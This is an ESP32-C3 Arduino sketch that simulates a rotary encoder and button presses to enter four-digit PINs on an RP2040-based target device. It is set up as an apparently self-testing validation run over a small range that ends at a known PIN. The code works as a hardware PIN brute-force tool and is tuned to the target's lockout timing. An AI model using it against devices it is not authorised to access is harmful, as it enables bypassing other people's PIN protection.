/*
  Fast exhaustive four-digit PIN entry for ESP32-C3 Dev Module.

  Confirmed wiring:
    ESP32 GPIO4 -> encoder A / RP2040 GPIO27
    ESP32 GPIO5 -> encoder B / RP2040 GPIO29
    ESP32 GPIO6 -> encoder button / RP2040 GPIO28
    ESP32 GND   -> target GND

  The ESP32 only pulls lines LOW or releases them. It never drives HIGH.
*/

constexpr uint8_t PIN_ENCODER_A = 4;
constexpr uint8_t PIN_ENCODER_B = 5;
constexpr uint8_t PIN_ENCODER_SW = 6;

// Balanced-speed validation run. The known-good PIN is the last attempt, so
// the ESP32 stops immediately after the expected unlock.
constexpr bool EXHAUSTIVE_SEARCH = true;
constexpr uint16_t FIRST_ATTEMPT = 3912;
constexpr uint16_t LAST_ATTEMPT = 3920;

constexpr uint32_t START_DELAY_MS = 2000;
constexpr uint32_t PHASE_DELAY_MS = 8;
constexpr uint32_t BETWEEN_DETENTS_MS = 82;
constexpr uint32_t BEFORE_BUTTON_MS = 15;
constexpr uint32_t BUTTON_DOWN_MS = 15;
constexpr uint32_t BUTTON_RELEASE_MS = 35;

// The target itself spends about 1.2 s indicating a wrong PIN. A small margin
// is necessary so the next attempt starts only after the target has reset all
// four displayed positions back to zero.
constexpr uint32_t AFTER_ATTEMPT_MS = 1360;

// The target changes the displayed digit after half of a full quadrature
// cycle. This flag keeps the electrical phase synchronized across button
// presses. Pressing the button resets the displayed digit to 0, but does not
// reset the physical A/B phase.
bool encoderAt11 = true;

void pullLow(uint8_t pin) {
  digitalWrite(pin, LOW);
  pinMode(pin, OUTPUT);
}

void releaseLine(uint8_t pin) {
  pinMode(pin, INPUT);
}

void releaseAllLines() {
  releaseLine(PIN_ENCODER_A);
  releaseLine(PIN_ENCODER_B);
  releaseLine(PIN_ENCODER_SW);
}

// One displayed-digit increment is a HALF quadrature cycle.
void rotateOneStepUp() {
  if (encoderAt11) {
    pullLow(PIN_ENCODER_B);       // 11 -> 01
    delay(PHASE_DELAY_MS);
    pullLow(PIN_ENCODER_A);       // 01 -> 00
    encoderAt11 = false;
  }
  else {
    releaseLine(PIN_ENCODER_B);   // 00 -> 10
    delay(PHASE_DELAY_MS);
    releaseLine(PIN_ENCODER_A);   // 10 -> 11
    encoderAt11 = true;
  }

  delay(BETWEEN_DETENTS_MS);
}

// One displayed-digit decrement, also using a synchronized half-cycle.
void rotateOneStepDown() {
  if (encoderAt11) {
    pullLow(PIN_ENCODER_A);       // 11 -> 10
    delay(PHASE_DELAY_MS);
    pullLow(PIN_ENCODER_B);       // 10 -> 00
    encoderAt11 = false;
  }
  else {
    releaseLine(PIN_ENCODER_A);   // 00 -> 01
    delay(PHASE_DELAY_MS);
    releaseLine(PIN_ENCODER_B);   // 01 -> 11
    encoderAt11 = true;
  }

  delay(BETWEEN_DETENTS_MS);
}

void clickEncoder() {
  pullLow(PIN_ENCODER_SW);
  delay(BUTTON_DOWN_MS);
  releaseLine(PIN_ENCODER_SW);
  delay(BUTTON_RELEASE_MS);
}

void enterDigitFromZero(uint8_t digit) {
  // Take the shortest route around 0..9: for example, 9 is one step down
  // instead of nine steps up.
  if (digit <= 5) {
    for (uint8_t step = 0; step < digit; ++step) {
      rotateOneStepUp();
    }
  }
  else {
    for (uint8_t step = 0; step < 10 - digit; ++step) {
      rotateOneStepDown();
    }
  }

  Serial.printf("Displayed digit should now be %u; waiting before click\n", digit);
  delay(BEFORE_BUTTON_MS);
  clickEncoder();
}

void enterAttempt(uint16_t value) {
  const uint8_t digits[4] = {
    static_cast<uint8_t>((value / 1000) % 10),
    static_cast<uint8_t>((value / 100) % 10),
    static_cast<uint8_t>((value / 10) % 10),
    static_cast<uint8_t>(value % 10)
  };

  Serial.printf("Trying %04u\n", value);
  for (const uint8_t digit : digits) {
    // After every click the target resets the next displayed position to 0.
    enterDigitFromZero(digit);
  }
}

void setup() {
  Serial.begin(115200);
  releaseAllLines();
  delay(START_DELAY_MS);

  if (!EXHAUSTIVE_SEARCH) {
    Serial.println("VERIFICATION MODE: one slow visible attempt, PIN 3915");
    enterAttempt(3915);
    Serial.println("Verification finished; ESP32 is now idle.");
    return;
  }
Serial.printf("Starting PIN search: %04u..%04u\n", FIRST_ATTEMPT, LAST_ATTEMPT);
  Serial.println("Disconnect or reset the ESP32 when the target unlocks.");
  for (uint16_t attempt = FIRST_ATTEMPT; attempt <= LAST_ATTEMPT; ++attempt) {
    enterAttempt(attempt);
    delay(AFTER_ATTEMPT_MS);
  }

  Serial.println("All combinations have been attempted.");
}

void loop() {
  delay(1000);
}
